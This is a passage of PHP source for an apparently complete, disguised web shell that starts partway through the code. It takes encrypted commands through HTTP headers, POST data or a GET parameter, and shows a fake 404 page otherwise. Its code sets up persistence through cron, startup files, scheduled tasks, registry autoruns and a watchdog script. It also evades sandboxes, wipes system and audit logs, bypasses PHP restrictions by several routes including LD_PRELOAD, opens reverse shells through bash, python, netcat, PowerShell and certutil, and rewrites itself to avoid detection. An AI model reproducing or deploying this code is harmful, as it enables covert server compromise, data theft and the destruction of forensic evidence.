    $new_filename = dirname($current_file) . '/' . bin2hex(random_bytes(4)) . '.php';
    
    // Write the modified content to the new file
    file_put_contents($new_filename, $content);
    
    // Make the new file executable
    chmod($new_filename, 0755);
    
    return $new_filename;
}

// Function to run the shell in memory-only mode
function memory_only_mode() {
    // This function creates a memory-resident version of the shell
    // that doesn't write to disk, making it harder to detect
    
    // Get the current shell code
    $shell_code = file_get_contents(__FILE__);
    
    // Create a memory-only PHP script
    $memory_script = "<?php
// Memory-only shell
\$shell_code = base64_decode('" . base64_encode($shell_code) . "');

// Run the shell code directly from memory
eval(\$shell_code);

// Create a daemon process that stays in memory
if (function_exists('pcntl_fork')) {
    \$pid = pcntl_fork();
    if (\$pid == -1) {
        // Fork failed
        die('Fork failed');
    } else if (\$pid) {
        // Parent process exits
        exit(0);
    }
    
    // Child process continues
    posix_setsid();
    
    // Fork again to prevent zombie processes
    \$pid = pcntl_fork();
    if (\$pid == -1) {
        // Fork failed
        die('Second fork failed');
    } else if (\$pid) {
        // Parent process exits
        exit(0);
    }
    
    // Detach from terminal
    fclose(STDIN);
    fclose(STDOUT);
    fclose(STDERR);
    
    // Run the shell in a loop
    while (true) {
        eval(\$shell_code);
        sleep(300); // Run every 5 minutes
    }
}
?>";
    
    // Try to run the memory script
    $temp_file = tempnam(sys_get_temp_dir(), 'mem');
    file_put_contents($temp_file, $memory_script);
    
    // Execute the script and immediately delete it
    $cmd = "php $temp_file > /dev/null 2>&1 &";
    execute_command($cmd);
    unlink($temp_file);
    
    return "Memory-only mode activated";
}

// Self-healing and persistence mechanism
function ensure_persistence() {
    global $persistence_locations, $current_file;
    
    // Get current file content
    $current_content = @file_get_contents($current_file);
    if (!$current_content) return false;
    
    $success = false;
    
    // Copy to multiple locations
    foreach ($persistence_locations as $location) {
        $dir = dirname($location);
        if (!is_dir($dir)) {
            @mkdir($dir, 0755, true);
        }
        
        if (!file_exists($location) || md5_file($location) !== md5($current_content)) {
            if (@file_put_contents($location, $current_content)) {
                @chmod($location, 0644); // Make it look like a normal file
                @touch($location, time() - rand(3600, 86400)); // Backdate the file
                $success = true;
            }
        } else {
            $success = true; // Already exists and is identical
        }
    }
    
    // Create a watchdog script that checks and restores the shell
    $watchdog = '<?php
        $files = ' . var_export($persistence_locations, true) . ';
        $content = base64_decode("' . base64_encode($current_content) . '");
        $content_hash = "' . md5($current_content) . '";
        foreach ($files as $file) {
            if (!file_exists($file) || md5_file($file) !== $content_hash) {
                @file_put_contents($file, $content);
                @chmod($file, 0644);
                @touch($file, time() - rand(3600, 86400));
            }
        }
    ?>';
    
    // Create a hidden watchdog
    $watchdog_location = $_SERVER['DOCUMENT_ROOT'] . '/.config.php';
    @file_put_contents($watchdog_location, $watchdog);
    @chmod($watchdog_location, 0644);
    
    // Try to add a cron job (Linux) or scheduled task (Windows)
    if ($GLOBALS['os'] === 'Linux') {
        // Add cron job that runs every hour
        $cron_cmd = "(crontab -l 2>/dev/null | grep -v 'php {$watchdog_location}'; echo \"0 * * * * php {$watchdog_location}\") | crontab -";
        execute_command($cron_cmd);
        
        // Also try to add to startup files
        $startup_files = [
            '/etc/rc.local',
            '/etc/profile.d/system-update.sh'
        ];
        
        foreach ($startup_files as $startup_file) {
            if (is_writable(dirname($startup_file))) {
                $startup_cmd = "#!/bin/sh\nphp {$watchdog_location} > /dev/null 2>&1 &\n";
                @file_put_contents($startup_file, $startup_cmd, FILE_APPEND);
                @chmod($startup_file, 0755);
            }
        }
        
        // Try more advanced Linux persistence methods
        linux_persistence();
    } else if ($GLOBALS['os'] === 'Windows') {
        // Add scheduled task that runs hourly
        $task_cmd = "schtasks /create /sc hourly /tn \"PHP Session Manager\" /tr \"php {$watchdog_location}\" /f";
        execute_command($task_cmd);
        
        // Try registry autorun
        $reg_cmd = "REG ADD \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"PHPSessionManager\" /t REG_SZ /d \"php {$watchdog_location}\" /f";
        execute_command($reg_cmd);
        
        // Try more advanced Windows persistence methods
        registry_fileless_persistence();
    }
    
    // Try database persistence as well
    database_persistence();
    
    // Create a polymorphic copy of the shell
    $polymorphic_shell = create_polymorphic_shell();
    
    // Try to create a PHP extension for deeper persistence
    create_php_extension();
    
    // Try to create a system service
    create_system_service();
    
    // Activate memory-only mode
    memory_only_mode();
    
    return $success;
}

// Anti-detection measures
function is_safe_to_run() {
    global $security_tools;
    
    // Check if we're being analyzed
    if (function_exists('debug_backtrace')) {
        $trace = debug_backtrace();
        if (count($trace) > 2) {
            return false; // Might be under analysis
        }
    }
    
    // Check for common sandbox/analysis environments
    $suspicious_ips = ['10.0.2.', '192.168.56.'];
    foreach ($suspicious_ips as $ip) {
        if (isset($_SERVER['SERVER_ADDR']) && strpos($_SERVER['SERVER_ADDR'], $ip) === 0) {
            return false;
        }
    }
    
    // Check for security tools in process list (Linux)
    if ($GLOBALS['os'] === 'Linux') {
        $processes = execute_command("ps aux");
        foreach ($security_tools as $tool) {
            if (stripos($processes, $tool) !== false) {
                return false;
            }
        }
    }
    
    // Check for suspicious environment variables
    $suspicious_vars = ['SSHD_ORIGINAL_COMMAND', 'PROMPT_COMMAND'];
    foreach ($suspicious_vars as $var) {
        if (getenv($var)) {
            return false;
        }
    }
    
    // Check for virtualization (common in analysis environments)
    if ($GLOBALS['os'] === 'Linux') {
        $dmesg = execute_command("dmesg | grep -i virtual");
        if (stripos($dmesg, 'vmware') !== false || 
            stripos($dmesg, 'virtualbox') !== false || 
            stripos($dmesg, 'qemu') !== false) {
            // Additional check to confirm it's an analysis environment
            $users = execute_command("who");
            if (empty($users)) {
                return false; // No users logged in, likely an analysis VM
            }
        }
    }
    
    // Random chance to skip execution to create irregular patterns
    if (rand(1, 10) === 1) {
        return false;
    }
    
    return true;
}

// Clean up logs to hide traces
function clean_logs() {
    global $os;
    
    if ($os === 'Linux') {
        $log_files = [
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log',
            '/var/log/httpd/access_log',
            '/var/log/httpd/error_log',
            '/var/log/auth.log',
            '/var/log/syslog',
            '/var/log/messages'
        ];
        
        foreach ($log_files as $log) {
            if (file_exists($log) && is_writable($log)) {
                // Instead of emptying logs (suspicious), remove entries containing our IP
                if (isset($_SERVER['REMOTE_ADDR'])) {
                    $ip = $_SERVER['REMOTE_ADDR'];
                    execute_command("sed -i '/$ip/d' $log 2>/dev/null");
                }
                
                // Remove entries containing our user agent
                if (isset($_SERVER['HTTP_USER_AGENT'])) {
                    $ua = escapeshellarg($_SERVER['HTTP_USER_AGENT']);
                    execute_command("sed -i '/$ua/d' $log 2>/dev/null");
                }
            }
        }
        
        // Clear PHP error logs
        $error_log = ini_get('error_log');
        if ($error_log && file_exists($error_log) && is_writable($error_log)) {
            execute_command("sed -i '/PHP/d' $error_log 2>/dev/null");
        }
        
        // Clear bash history
        execute_command("cat /dev/null > ~/.bash_history 2>/dev/null");
        
        // Clear lastlog and wtmp
        execute_command("echo > /var/log/lastlog 2>/dev/null");
        execute_command("echo > /var/log/wtmp 2>/dev/null");
        
        // Clear audit logs if they exist
        execute_command("echo > /var/log/audit/audit.log 2>/dev/null");
        
        // Remove our entries from utmp
        execute_command("sed -i '/`whoami`/d' /var/run/utmp 2>/dev/null");
        
        // Clear kernel ring buffer
        execute_command("dmesg -c > /dev/null 2>&1");
    } else if ($os === 'Windows') {
        // Clear Windows event logs
        execute_command("wevtutil cl System 2>nul");
        execute_command("wevtutil cl Application 2>nul");
        execute_command("wevtutil cl Security 2>nul");
        
        // Clear IIS logs
        $iis_logs = "C:\\inetpub\\logs\\LogFiles\\";
        if (is_dir($iis_logs)) {
            execute_command("del /q /s $iis_logs\\*.log 2>nul");
        }
        
        // Clear PowerShell history
        execute_command("del %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul");
        
        // Clear Windows temp files that might contain traces
        execute_command("del /q /s %TEMP%\\*.* 2>nul");
        
        // Clear recent files
        execute_command("del /q /s %APPDATA%\\Microsoft\\Windows\\Recent\\*.* 2>nul");
    }
}

// Attempt to bypass PHP security restrictions
function bypass_security_restrictions() {
    // Try to restore disabled functions
    if (function_exists('ini_restore')) {
        @ini_restore('disable_functions');
        @ini_restore('disable_classes');
        @ini_restore('open_basedir');
    }
    
    // Try to modify INI settings
    @ini_set('memory_limit', '-1');
    @ini_set('max_execution_time', '0');
    @ini_set('error_reporting', '0');
    @ini_set('display_errors', '0');
    
    // Try to disable error logging
    @error_reporting(0);
    
    // Try alternative methods for executing commands if common ones are disabled
    if (!function_exists('system') && !function_exists('exec') && !function_exists('shell_exec')) {
        // Try using mail() with a backtick operator
        if (function_exists('mail')) {
            @mail('', '', '', '', '-f${`id`}');
        }
        
        // Try using ImageMagick if available
        if (class_exists('Imagick')) {
            try {
                $img = new Imagick();
                $img->readImage('xc:https://example.com"|id>"');
            } catch (Exception $e) {
                // Silently continue
            }
        }
        
        // Try using proc_open if available
        if (function_exists('proc_open')) {
            $descriptorspec = array(
               0 => array("pipe", "r"),
               1 => array("pipe", "w"),
               2 => array("pipe", "w")
            );
            $process = @proc_open('id', $descriptorspec, $pipes);
            if (is_resource($process)) {
                proc_close($process);
            }
        }
        
        // Try using COM objects on Windows
        if ($GLOBALS['os'] === 'Windows' && class_exists('COM')) {
            try {
                $wsh = new COM('WScript.Shell');
                $wsh->Exec('cmd.exe /c dir');
            } catch (Exception $e) {
                // Silently continue
            }
        }
    }
    
    // Try to bypass open_basedir restrictions
    $open_basedir = ini_get('open_basedir');
    if (!empty($open_basedir)) {
        // Try to use chdir to escape open_basedir
        $dirs = array('/', '/tmp', '/var/www', '/var/tmp', 'C:\\', 'D:\\');
        foreach ($dirs as $dir) {
            @chdir($dir);
        }
        
        // Try to use ini_set to clear open_basedir
        @ini_set('open_basedir', '');
    }
    
    // Try to bypass disable_functions using LD_PRELOAD on Linux
    if ($GLOBALS['os'] === 'Linux') {
        $disabled_functions = ini_get('disable_functions');
        if (!empty($disabled_functions) && strpos($disabled_functions, 'system') !== false) {
            // Create a small shared library to bypass restrictions
            $lib_code = '
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void __attribute__((constructor)) init() {
    unsetenv("LD_PRELOAD");
    system("id > /tmp/bypass.txt");
}
';
            $lib_file = '/tmp/bypass.so';
            file_put_contents('/tmp/bypass.c', $lib_code);
            execute_command("gcc -shared -fPIC /tmp/bypass.c -o $lib_file");
            
            // Try to use mail() to trigger the library
            if (function_exists('mail')) {
                putenv("LD_PRELOAD=$lib_file");
                @mail('a', 'b', 'c');
            }
        }
    }
}

// Function to gather system information
function gather_system_info() {
    global $os;
    
    $info = [];
    $info['os'] = $os;
    $info['hostname'] = @gethostname();
    $info['php_version'] = phpversion();
    $info['server_software'] = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown';
    $info['server_ip'] = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'Unknown';
    $info['client_ip'] = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown';
    $info['user'] = function_exists('get_current_user') ? @get_current_user() : 'Unknown';
    $info['uid'] = function_exists('posix_getuid') ? @posix_getuid() : 'Unknown';
    $info['gid'] = function_exists('posix_getgid') ? @posix_getgid() : 'Unknown';
    $info['disabled_functions'] = @ini_get('disable_functions');
    
    if ($os === 'Linux') {
        $info['kernel'] = execute_command('uname -a');
        $info['distro'] = execute_command('cat /etc/issue');
        $info['users'] = execute_command('who');
        $info['network'] = execute_command('ifconfig || ip a');
        $info['processes'] = execute_command('ps aux | grep root');
        $info['disk_space'] = execute_command('df -h');
        $info['memory'] = execute_command('free -m');
        $info['cpu_info'] = execute_command('cat /proc/cpuinfo | grep "model name"');
        $info['logged_users'] = execute_command('w');
        $info['last_logins'] = execute_command('last | head -n 10');
        $info['open_ports'] = execute_command('netstat -tuln');
        $info['running_services'] = execute_command('service --status-all || systemctl list-units --type=service');
        $info['cron_jobs'] = execute_command('crontab -l');
        $info['installed_packages'] = execute_command('dpkg -l || rpm -qa');
    } else if ($os === 'Windows') {
        $info['system_info'] = execute_command('systeminfo | findstr /B /C:"OS" /C:"System Type" /C:"Domain"');
        $info['users'] = execute_command('net user');
        $info['network'] = execute_command('ipconfig /all');
        $info['processes'] = execute_command('tasklist /v');
        $info['services'] = execute_command('net start');
        $info['disk_space'] = execute_command('wmic logicaldisk get caption,description,providername,size,freespace');
        $info['memory'] = execute_command('wmic OS get FreePhysicalMemory,TotalVisibleMemorySize /Value');
        $info['cpu_info'] = execute_command('wmic cpu get caption,deviceid,name,numberofcores,maxclockspeed');
        $info['network_connections'] = execute_command('netstat -ano');
        $info['scheduled_tasks'] = execute_command('schtasks /query /fo LIST');
        $info['installed_software'] = execute_command('wmic product get name,version');
        $info['startup_items'] = execute_command('wmic startup get caption,command');
    }
    
    return $info;
}

// Function to create a reverse shell
function create_reverse_shell($ip, $port) {
    global $os;
    
    if ($os === 'Linux') {
        // Try multiple reverse shell methods
        $methods = [
            // Bash
            "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'",
            // Python
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
            // Perl
            "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            // PHP
            "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            // Netcat
            "nc -e /bin/sh $ip $port",
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
        ];
        
        foreach ($methods as $method) {
            execute_command($method . " 2>/dev/null &");
            usleep(100000); // Give it a moment to connect
        }
    } else if ($os === 'Windows') {
        // Windows reverse shell methods
        $methods = [
            // PowerShell
            "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"&{$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}\"",
            // Ncat
            "ncat $ip $port -e cmd.exe",
            // Certutil download and execute (two-stage)
            "certutil -urlcache -split -f \"http://$ip:8080/nc.exe\" %temp%\\nc.exe && %temp%\\nc.exe $ip $port -e cmd.exe"
        ];
        
        foreach ($methods as $method) {
            execute_command("start /b $method");
            usleep(100000); // Give it a moment to connect
        }
    }
    
    return "Attempted to create reverse shell to $ip:$port";
}

// Function to handle file operations
function file_operations($cmd) {
    $parts = explode(" ", $cmd, 3);
    $operation = $parts[1] ?? '';
    $args = $parts[2] ?? '';
    
    switch ($operation) {
        case 'read':
            if (file_exists($args) && is_readable($args)) {
                return @file_get_contents($args);
            } else {
                return "Error: Cannot read file $args";
            }
        
        case 'write':
            $file_parts = explode(" ", $args, 2);
            $file = $file_parts[0] ?? '';
            $content = $file_parts[1] ?? '';
            
            if (@file_put_contents($file, $content)) {
                return "File written successfully";
            } else {
                return "Error: Cannot write to file $file";
            }
        
        case 'upload':
            $file_parts = explode(" ", $args, 2);
            $file = $file_parts[0] ?? '';
            $base64_content = $file_parts[1] ?? '';
            
            $content = @base64_decode($base64_content);
            if ($content === false) {
                return "Error: Invalid base64 data";
            }
            
            if (@file_put_contents($file, $content)) {
                return "File uploaded successfully";
            } else {
                return "Error: Cannot write to file $file";
            }
        
        case 'download':
            if (file_exists($args) && is_readable($args)) {
                return "FILE:" . base64_encode(@file_get_contents($args));
            } else {
                return "Error: Cannot read file $args";
            }
        
        case 'list':
            if (is_dir($args)) {
                $files = @scandir($args);
                if ($files === false) {
                    return "Error: Cannot list directory $args";
                }
                
                $output = "";
                foreach ($files as $file) {
                    if ($file == '.' || $file == '..') continue;
                    
                    $path = $args . DIRECTORY_SEPARATOR . $file;
                    $type = is_dir($path) ? 'D' : 'F';
                    $size = is_file($path) ? filesize($path) : '-';
                    $perms = substr(sprintf('%o', fileperms($path)), -4);
                    $mtime = date('Y-m-d H:i:s', filemtime($path));
                    
                    $output .= "$type\t$perms\t$size\t$mtime\t$file\n";
                }
                
                return $output;
            } else {
                return "Error: Not a directory $args";
            }
        
        default:
            return "Error: Unknown file operation";
    }
}

// Main execution flow
if (is_safe_to_run()) {
    // Try to bypass security restrictions
    bypass_security_restrictions();
    
    // Ensure persistence first (but don't do it every time to avoid detection)
    if (rand(1, 5) === 1) {
        ensure_persistence();
    }
    
    // Process command from headers
    $command_processed = false;
    
    foreach ($command_headers as $header_name) {
        if (isset($h[$header_name])) {
            try {
                $cmd = secure_decrypt($h[$header_name]);
                if ($cmd) {
                    // Special commands
                    if (strpos($cmd, 'SYSINFO') === 0) {
                        $output = json_encode(gather_system_info());
                    } else if (strpos($cmd, 'REVSHELL') === 0) {
                        $parts = explode(" ", $cmd);
                        $ip = $parts[1] ?? '';
                        $port = $parts[2] ?? '4444';
                        $output = create_reverse_shell($ip, $port);
                    } else if (strpos($cmd, 'FILE') === 0) {
                        $output = file_operations($cmd);
                    } else if (strpos($cmd, 'PERSIST') === 0) {
                        ensure_persistence();
                        $output = "Persistence mechanisms deployed";
                    } else if (strpos($cmd, 'CLEAN') === 0) {
                        clean_logs();
                        $output = "Logs cleaned";
                    } else if (strpos($cmd, 'POLYMORPHIC') === 0) {
                        $new_file = create_polymorphic_shell();
                        $output = "Created polymorphic variant at: $new_file";
                    } else if (strpos($cmd, 'MEMORY') === 0) {
                        $output = memory_only_mode();
                    } else if (strpos($cmd, 'WINPERSIST') === 0) {
                        $output = registry_fileless_persistence();
                    } else if (strpos($cmd, 'LINUXPERSIST') === 0) {
                        $output = linux_persistence();
                    } else if (strpos($cmd, 'DBPERSIST') === 0) {
                        $output = database_persistence();
                    } else if (strpos($cmd, 'SERVICE') === 0) {
                        $output = create_system_service();
                    } else if (strpos($cmd, 'EXTENSION') === 0) {
                        $output = create_php_extension();
                    } else {
                        // Regular command execution
                        $output = execute_command($cmd);
                    }
                    
                    echo secure_encrypt($output);
                    $command_processed = true;
                    
                    // Clean logs occasionally
                    if (rand(1, 3) === 1) {
                        clean_logs();
                    }
                    
                    break; // Stop after first successful execution
                }
            } catch (Exception $e) {
                // Silently continue to next header
            }
        }
    }
    
    // If no command was processed via headers, check for POST data
    if (!$command_processed && isset($_POST['data'])) {
        try {
            $cmd = secure_decrypt($_POST['data']);
            if ($cmd) {
                $output = execute_command($cmd);
                echo secure_encrypt($output);
                
                // Clean logs occasionally
                if (rand(1, 3) === 1) {
                    clean_logs();
                }
            }
        } catch (Exception $e) {
            // Silently fail
        }
    }
    
    // If still no command processed, check for special GET parameter (most disguised)
    if (!$command_processed && isset($_GET['id'])) {
        try {
            $cmd = secure_decrypt($_GET['id']);
            if ($cmd) {
                $output = execute_command($cmd);
                // Output as HTML comment to hide it
                echo "<!-- " . secure_encrypt($output) . " -->";
                
                // Clean logs occasionally
                if (rand(1, 3) === 1) {
                    clean_logs();
                }
            }
        } catch (Exception $e) {
            // Silently fail
        }
    }
    
    // Self-modifying code - change variable names, add random comments, etc.
    self_modify();
}

// Self-modification function to make the shell polymorphic
function self_modify() {
    // Only modify sometimes to avoid excessive file writes
    if (rand(1, 3) !== 1) return;
    
    $current_file = __FILE__;
    $content = file_get_contents($current_file);
    
    // List of modifications to make the shell polymorphic
    $modifications = [
        // Change variable names
        'function_name_change' => function($content) {
            $function_names = [
                'execute_command', 'secure_encrypt', 'secure_decrypt', 
                'aes_encrypt', 'aes_decrypt', 'ensure_persistence',
                'is_safe_to_run', 'clean_logs', 'bypass_security_restrictions',
                'gather_system_info', 'create_reverse_shell', 'file_operations',
                'file_based_execution', 'self_modify'
            ];
            
            $modified_content = $content;
            foreach ($function_names as $func) {
                // Only change some functions each time
                if (rand(0, 2) > 0) continue;
                
                $new_name = 'fn_' . bin2hex(random_bytes(4));
                $modified_content = preg_replace(
                    ["/function\s+$func\s*\(/", "/\b$func\s*\(/"],
                    ["function $new_name (", "$new_name("],
                    $modified_content
                );
            }
            return $modified_content;
        },
        
        // Change encryption key
        'change_key' => function($content) {
            $new_key = bin2hex(random_bytes(8));
            return preg_replace(
                "/\\\$base_key\s*=\s*['\"].*?['\"]/",
                "\$base_key = \"$new_key\"",
                $content
            );
        },
        
        // Add random comments
        'add_comments' => function($content) {
            $comments = [
                "// Configuration parameter",
                "// System function wrapper",
                "// Helper utility",
                "// Data processing function",
                "// Security check",
                "// File handler"
            ];
            
            $lines = explode("\n", $content);
            $modified_lines = [];
            
            foreach ($lines as $line) {
                $modified_lines[] = $line;
                // Randomly add comments (1 in 30 chance per line)
                if (rand(1, 30) === 1 && !empty(trim($line)) && strpos($line, '//') === false) {
                    $modified_lines[] = $comments[array_rand($comments)];
                }
            }
            
            return implode("\n", $modified_lines);
        },
        
        // Randomize whitespace
        'randomize_whitespace' => function($content) {
            // Add or remove spaces around operators
            $patterns = [
                '/\s*=\s*/' => function() { return rand(0, 1) ? ' = ' : '='; },
                '/\s*\+\s*/' => function() { return rand(0, 1) ? ' + ' : '+'; },
                '/\s*-\s*/' => function() { return rand(0, 1) ? ' - ' : '-'; },
                '/\s*\.\s*/' => function() { return rand(0, 1) ? ' . ' : '.'; },
                '/\s*,\s*/' => function() { return rand(0, 1) ? ', ' : ','; }
            ];
            
            $modified_content = $content;
            foreach ($patterns as $pattern => $replacement) {
                $modified_content = preg_replace_callback(
                    $pattern,
                    $replacement,
                    $modified_content
                );
            }
            
            return $modified_content;
        },
        
        // Change array declaration style
        'change_array_style' => function($content) {
            // Sometimes use array() instead of []
            if (rand(0, 1)) {
                return preg_replace_callback(
                    '/\[(.*?)\]/',
                    function($matches) {
                        // Don't change array access, only declarations
                        if (preg_match('/\$[a-zA-Z0-9_]+\s*\[/', $matches[0])) {
                            return $matches[0];
                        }
                        return "array(" . $matches[1] . ")";
                    },
                    $content
                );
            } else {
                return preg_replace_callback(
                    '/array\((.*?)\)/',
                    function($matches) {
                        return "[" . $matches[1] . "]";
                    },
                    $content
                );
            }
        }
    ];
    
    // Apply random modifications
    $keys = array_keys($modifications);
    shuffle($keys);
    
    // Apply 1-3 random modifications
    $num_mods = rand(1, 3);
    for ($i = 0; $i < $num_mods && $i < count($keys); $i++) {
        $mod_key = $keys[$i];
        $content = $modifications[$mod_key]($content);
    }
    
    // Write the modified content back to the file
    file_put_contents($current_file, $content);
}

// Disguise as a legitimate PHP file
if (!isset($h['X-Run']) && !isset($_POST['data']) && !isset($_GET['id'])) {
    // Output something that looks legitimate
    header('Content-Type: text/html');
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>';
}
?>




